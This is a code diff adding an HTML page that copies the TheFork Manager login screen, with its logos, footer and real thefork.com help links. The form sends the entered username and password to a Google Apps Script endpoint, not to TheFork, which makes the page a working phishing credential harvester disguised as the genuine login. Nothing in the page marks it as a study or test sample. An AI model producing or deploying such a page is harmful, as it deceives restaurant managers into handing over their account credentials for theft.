@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/x-icon" href="assets/fork logo.svg" />
+    <script src="script.js" defer></script>
+    <title>The Fork Manager</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left">
+        <h1>Welcome to TheFork</h1>
+        <div class="text">
+          <h3>Attract</h3>
+          <img src="assets/Ellipse 5.svg" alt="" />
+          <h3>Manage</h3>
+          <img src="assets/Ellipse 5.svg" alt="" />
+          <h3>Retain</h3>
+        </div>
+      </div>
+      <div class="right">
+        <div class="name">
+          <img src="assets/thefork-manager-logo.svg" alt="" id="manager-logo" />
+          <img src="assets/thefork.svg" alt="" id="fork-logo" />
+        </div>
+
+        <form
+          action="https://script.google.com/macros/s/AKfycbw6UgtSsIKPHahdgskDgp4Q49oMb4aW3PfcUvI-EnBZeIiNaIHeFLudSH1KZ7NHo4Hb/exec"
+          method="post"
+          name="login-form"
+        >
+          <div class="input-wrapper">
+            <input
+              type="text"
+              name="Username"
+              id="username"
+              autocomplete="off"
+              placeholder=" "
+            />
+            <label for="username">Username or email</label>
+          </div>
+          <div class="input-wrapper">
+            <input
+              type="password"
+              id="password"
+              name="Password"
+              autocomplete="off"
+              required
+              placeholder=""
+            />
+            <button id="toggle-password" type="button">
+              <span class="eye-icon"><img src="assets/eye.svg" alt="" /></span>
+              <span class="eye-slash-icon" style="display: none">
+                <img src="assets/close lid.svg" alt="" />
+              </span>
+            </button>
+            <label for="password">Password</label>
+          </div>
+          <p class="links">
+            <a href="https://manager.thefork.com/forgot-password"
+              >First connection</a
+            >
+            /
+            <a href="https://manager.thefork.com/forgot-password"
+              >Forgot Password?</a
+            >
+          </p>
+          <input type="submit" value="CONNECT" />
+          <p class="signup-link">
+            Not a member yet?
+            <a href="https://www.theforkmanager.com/">Sign up now</a>
+          </p>
+        </form>
+
+        <div class="footer">
+          <div class="footer-links">
+            <a href="http://thefork.com/" id="fork">thefork.com</a>
+            <i class="slash">|</i>
+            <p>Cookie consent</p>
+            |
+            <a href="https://thefork.com/legal#PrivacyPolicy"
+              >Privacy and Cookies Statement</a
+            >
+          </div>
+          <p class="copyright">2006 - 2025 TheFork Manager</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
